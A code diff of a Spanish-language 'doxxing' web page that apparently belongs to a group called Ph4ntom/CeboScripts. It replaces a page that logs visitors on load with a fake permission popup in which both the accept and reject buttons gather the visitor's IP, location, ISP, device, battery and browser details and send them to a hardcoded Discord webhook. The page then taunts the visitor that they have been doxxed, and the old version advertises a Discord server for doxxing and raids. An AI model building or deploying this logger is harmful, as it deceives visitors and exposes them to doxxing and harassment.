@@ -11,147 +11,350 @@
             box-sizing: border-box;
         }
         body {
-            background: black;
-            color: red;
-            font-family: 'Arial Black', sans-serif;
-            text-align: center;
+            background: #000;
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             overflow: hidden;
         }
-        .main {
-            padding: 20px;
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(5px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
         }
-        h1 {
-            font-size: 3.5em;
-            text-shadow: 0 0 25px red;
-            animation: flicker 1.2s infinite alternate;
+        .modal {
+            background: #0a0a0a;
+            border: 2px solid #ff0000;
+            border-radius: 15px;
+            padding: 40px 50px;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(255,0,0,0.3);
+            animation: glow 2s infinite alternate;
         }
-        .discord-link {
-            font-size: 2.2em;
-            color: #7289da;
-            text-decoration: none;
-            background: #1e1e1e;
-            padding: 20px 40px;
-            border: 4px solid red;
-            border-radius: 10px;
-            display: inline-block;
-            margin: 30px auto;
-            box-shadow: 0 0 40px red;
+        @keyframes glow {
+            0% { box-shadow: 0 0 20px rgba(255,0,0,0.2); }
+            100% { box-shadow: 0 0 60px rgba(255,0,0,0.6); }
+        }
+        .modal h2 {
+            color: #ff0000;
+            font-size: 1.8em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(255,0,0,0.5);
+        }
+        .modal p {
+            color: #aaa;
+            font-size: 0.95em;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .modal .icon {
+            font-size: 3em;
+            margin-bottom: 15px;
+            display: block;
+        }
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        .btn {
+            padding: 12px 40px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
             transition: all 0.3s;
+            min-width: 120px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
-        .discord-link:hover {
-            background: #7289da;
-            color: white;
+        .btn-accept {
+            background: #ff0000;
+            color: #fff;
+            border: 1px solid #ff0000;
+        }
+        .btn-accept:hover {
+            background: #cc0000;
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(255,0,0,0.6);
+        }
+        .btn-reject {
+            background: transparent;
+            color: #fff;
+            border: 1px solid #555;
+        }
+        .btn-reject:hover {
+            background: #222;
+            border-color: #ff0000;
             transform: scale(1.05);
         }
-        p {
-            font-size: 1.7em;
-            color: white;
-            margin: 15px;
+        .status {
+            margin-top: 15px;
+            font-size: 0.8em;
+            color: #666;
+            display: none;
         }
-        #status {
-            color: #00ff00;
-            font-size: 1em;
-            margin-top: 20px;
+        .status.show {
+            display: block;
+            animation: fadeIn 0.5s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .hidden {
+            display: none !important;
+        }
+        .data-display {
+            margin-top: 15px;
             background: #111;
-            padding: 10px 20px;
+            padding: 10px;
             border-radius: 5px;
-            display: inline-block;
-            border: 1px solid #333;
+            font-size: 0.75em;
+            color: #888;
+            text-align: left;
+            word-break: break-all;
+            border: 1px solid #222;
+            display: none;
         }
-        @keyframes flicker {
-            0% { opacity: 1; }
-            50% { opacity: 0.7; }
-            100% { opacity: 1; }
-        }
-        @media (max-width: 600px) {
-            h1 { font-size: 2em; }
-            .discord-link { font-size: 1.2em; padding: 15px 20px; }
-            p { font-size: 1.2em; }
+        .data-display.show {
+            display: block;
         }
     </style>
 </head>
 <body>
-    <div class="main">
-        <h1>FUISTE DOXEADO POR PH4NTOM</h1>
-        <p>Tu IP y toda tu mierda ya están en la calle, cabrón...</p>
-        
-        <a href="https://discord.gg/Y5byWg6d8G" class="discord-link" target="_blank">
-            SI QUIERES DOXXEAR, RAIDEAR O CLONAR ENTRA AQUÍ
-        </a>
-        
-        <p>Ph4ntom te tiene fichado 👀</p>
-        <div id="status">🔄 Conectando...</div>
+
+    <!-- VENTANA EMERGENTE (GUI) -->
+    <div class="overlay" id="permissionOverlay">
+        <div class="modal">
+            <span class="icon">⚠️</span>
+            <h2>PERMISO REQUERIDO</h2>
+            <p>
+                Este sitio necesita acceder a tu información básica<br>
+                para continuar. ¿Aceptas?
+            </p>
+            <div class="btn-group">
+                <button class="btn btn-accept" id="btnAccept">ACEPTAR</button>
+                <button class="btn btn-reject" id="btnReject">RECHAZAR</button>
+            </div>
+            <div class="status" id="statusMsg">Enviando datos...</div>
+            <div class="data-display" id="dataDisplay"></div>
+        </div>
+    </div>
+
+    <!-- CONTENIDO PRINCIPAL (se muestra después de aceptar/rechazar) -->
+    <div class="main hidden" id="mainContent">
+        <h1 style="color:#ff0000; text-shadow:0 0 30px rgba(255,0,0,0.5);">FUISTE DOXEADO</h1>
+        <p style="color:#fff;">Ph4ntom ya tiene tus datos.</p>
+        <p style="color:#888; font-size:0.8em; margin-top:30px;">Acceso concedido el: <span id="accessTime"></span></p>
     </div>
 
     <script>
-        async function logIP() {
-            const statusDiv = document.getElementById('status');
-            
+        // ======== CONFIGURACIÓN ========
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD";
+
+        // ======== OBTENER DATOS DEL DISPOSITIVO ========
+        async function getDeviceData() {
+            const data = {};
+
+            // 1. IP y ubicación
             try {
-                statusDiv.textContent = '📡 Obteniendo IP...';
                 const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
+                const ipData = await res.json();
+                data.ip = ipData.ip || 'No disponible';
+                data.ciudad = ipData.city || 'No disponible';
+                data.pais = ipData.country_name || 'No disponible';
+                data.proveedor = ipData.org || 'No disponible';
+                data.region = ipData.region || 'No disponible';
+            } catch (e) {
+                data.ip = 'Error al obtener';
+                data.ciudad = 'Error';
+                data.pais = 'Error';
+                data.proveedor = 'Error';
+                data.region = 'Error';
+            }
 
-                const info = {
-                    ip: data.ip || 'No disponible',
-                    ciudad: data.city || 'No disponible',
-                    pais: data.country_name || 'No disponible',
-                    proveedor: data.org || 'No disponible',
-                    hora: new Date().toLocaleString(),
-                    userAgent: navigator.userAgent,
-                    referrer: document.referrer || 'Directo'
-                };
+            // 2. Dispositivo (Android/iOS/PC)
+            const ua = navigator.userAgent || '';
+            if (/android/i.test(ua)) {
+                data.dispositivo = 'Android';
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                data.dispositivo = 'iOS (iPhone/iPad)';
+            } else if (/windows/i.test(ua)) {
+                data.dispositivo = 'Windows PC';
+            } else if (/mac/i.test(ua)) {
+                data.dispositivo = 'Mac';
+            } else if (/linux/i.test(ua)) {
+                data.dispositivo = 'Linux';
+            } else {
+                data.dispositivo = 'Desconocido';
+            }
 
-                const webhook = "https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD";
+            // 3. Batería (solo disponible en algunos navegadores)
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    data.bateria = Math.round(battery.level * 100) + '%';
+                    data.cargando = battery.charging ? 'Sí' : 'No';
+                } else {
+                    data.bateria = 'No disponible';
+                    data.cargando = 'No disponible';
+                }
+            } catch (e) {
+                data.bateria = 'No disponible';
+                data.cargando = 'No disponible';
+            }
 
-                statusDiv.textContent = '📤 Enviando a Discord...';
-                const response = await fetch(webhook, {
+            // 4. Conexión de Internet (ISP ya lo tenemos arriba)
+            // Pero intentamos obtener más info de conexión
+            try {
+                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (conn) {
+                    data.tipoConexion = conn.effectiveType || 'No disponible';
+                    data.descarga = conn.downlink ? conn.downlink + ' Mbps' : 'No disponible';
+                } else {
+                    data.tipoConexion = 'No disponible';
+                    data.descarga = 'No disponible';
+                }
+            } catch (e) {
+                data.tipoConexion = 'No disponible';
+                data.descarga = 'No disponible';
+            }
+
+            // 5. Proveedor de internet (lo obtenemos de ipapi)
+            data.proveedorInternet = data.proveedor;
+
+            // 6. Dirección real (ubicación aproximada)
+            data.direccionReal = `${data.ciudad}, ${data.region}, ${data.pais}`;
+
+            // 7. Hora
+            data.hora = new Date().toLocaleString();
+
+            // 8. Referrer
+            data.referrer = document.referrer || 'Directo';
+
+            // 9. User Agent completo
+            data.userAgent = ua;
+
+            return data;
+        }
+
+        // ======== ENVIAR A DISCORD ========
+        async function sendToDiscord(data, accion) {
+            const statusMsg = document.getElementById('statusMsg');
+            statusMsg.classList.add('show');
+            statusMsg.textContent = '📤 Enviando datos...';
+
+            const embed = {
+                color: accion === 'Aceptar' ? 0x00ff00 : 0xffaa00,
+                title: `🔴 CeboScripts - ${accion}`,
+                fields: [
+                    { name: '📍 Dirección Real', value: data.direccionReal || 'No disponible', inline: false },
+                    { name: '🌐 IP', value: data.ip || 'No disponible', inline: true },
+                    { name: '🏙️ Ciudad', value: data.ciudad || 'No disponible', inline: true },
+                    { name: '🌍 País', value: data.pais || 'No disponible', inline: true },
+                    { name: '📱 Dispositivo', value: data.dispositivo || 'No disponible', inline: true },
+                    { name: '🔋 Batería', value: data.bateria || 'No disponible', inline: true },
+                    { name: '⚡ Cargando', value: data.cargando || 'No disponible', inline: true },
+                    { name: '📶 Conexión', value: data.tipoConexion || 'No disponible', inline: true },
+                    { name: '🏢 ISP', value: data.proveedorInternet || 'No disponible', inline: false },
+                    { name: '🕒 Hora', value: data.hora || 'No disponible', inline: false },
+                    { name: '💻 User-Agent', value: (data.userAgent || '').substring(0, 300), inline: false },
+                    { name: '🔗 Referrer', value: data.referrer || 'Directo', inline: false },
+                    { name: '⚡ Acción', value: accion, inline: true }
+                ],
+                footer: {
+                    text: 'CeboScripts • Datos capturados automáticamente'
+                },
+                timestamp: new Date().toISOString()
+            };
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        username: 'Ph4ntom IP Logger',
-                        content: '**¡Nueva víctima doxeada!**',
-                        embeds: [{
-                            color: 0xff0000,
-                            title: 'CeboScripts - Datos Recopilados',
-                            fields: [
-                                { name: '🌐 IP', value: info.ip, inline: true },
-                                { name: '🏙️ Ciudad', value: info.ciudad, inline: true },
-                                { name: '🌍 País', value: info.pais, inline: true },
-                                { name: '🏢 Proveedor', value: info.proveedor, inline: false },
-                                { name: '🕒 Hora', value: info.hora, inline: false },
-                                { name: '💻 User-Agent', value: info.userAgent.substring(0, 500), inline: false },
-                                { name: '🔗 Referrer', value: info.referrer, inline: false }
-                            ],
-                            footer: {
-                                text: 'CeboScripts • Datos capturados automáticamente'
-                            }
-                        }]
+                        username: 'CeboScripts Logger',
+                        content: `📢 **Nuevo registro - ${accion}**`,
+                        embeds: [embed]
                     })
                 });
 
                 if (response.ok) {
-                    statusDiv.textContent = '✅ ¡Datos enviados correctamente!';
-                    statusDiv.style.color = '#00ff00';
+                    statusMsg.textContent = '✅ ¡Datos enviados correctamente!';
+                    statusMsg.style.color = '#00ff00';
                     console.log('✅ Enviado correctamente');
                 } else {
                     const errorText = await response.text();
-                    statusDiv.textContent = `❌ Error ${response.status}`;
-                    statusDiv.style.color = '#ff0000';
+                    statusMsg.textContent = `❌ Error ${response.status}`;
+                    statusMsg.style.color = '#ff0000';
                     console.error('❌ Error webhook:', response.status, errorText);
                 }
             } catch (e) {
-                statusDiv.textContent = '❌ Error: ' + e.message;
-                statusDiv.style.color = '#ff0000';
-                console.error('❌ Error general:', e);
+                statusMsg.textContent = '❌ Error al enviar';
+                statusMsg.style.color = '#ff0000';
+                console.error('❌ Error:', e);
             }
+
+            // Mostrar datos en pantalla
+            const dataDisplay = document.getElementById('dataDisplay');
+            dataDisplay.classList.add('show');
+            dataDisplay.innerHTML = `
+                <strong>📍 Dirección:</strong> ${data.direccionReal}<br>
+                <strong>🌐 IP:</strong> ${data.ip}<br>
+                <strong>📱 Dispositivo:</strong> ${data.dispositivo}<br>
+                <strong>🔋 Batería:</strong> ${data.bateria}<br>
+                <strong>📶 ISP:</strong> ${data.proveedorInternet}
+            `;
         }
 
-        window.onload = logIP;
+        // ======== MANEJAR BOTONES ========
+        async function handleAction(accion) {
+            // Deshabilitar botones
+            document.getElementById('btnAccept').disabled = true;
+            document.getElementById('btnReject').disabled = true;
+            document.getElementById('btnAccept').style.opacity = '0.5';
+            document.getElementById('btnReject').style.opacity = '0.5';
+
+            // Obtener datos
+            const data = await getDeviceData();
+
+            // Enviar a Discord
+            await sendToDiscord(data, accion);
+
+            // Ocultar overlay después de 2 segundos
+            setTimeout(() => {
+                document.getElementById('permissionOverlay').classList.add('hidden');
+                document.getElementById('mainContent').classList.remove('hidden');
+                document.getElementById('accessTime').textContent = new Date().toLocaleString();
+            }, 2000);
+        }
+
+        // ======== EVENT LISTENERS ========
+        document.getElementById('btnAccept').addEventListener('click', () => handleAction('Aceptar'));
+        document.getElementById('btnReject').addEventListener('click', () => handleAction('Rechazar'));
+
+        // ======== CARGAR DATOS AL INICIAR (para previsualización) ========
+        window.onload = async function() {
+            // Solo para mostrar algo rápido, no afecta el envío
+            const data = await getDeviceData();
+            console.log('Datos cargados:', data);
+        };
     </script>
 </body>
 </html>
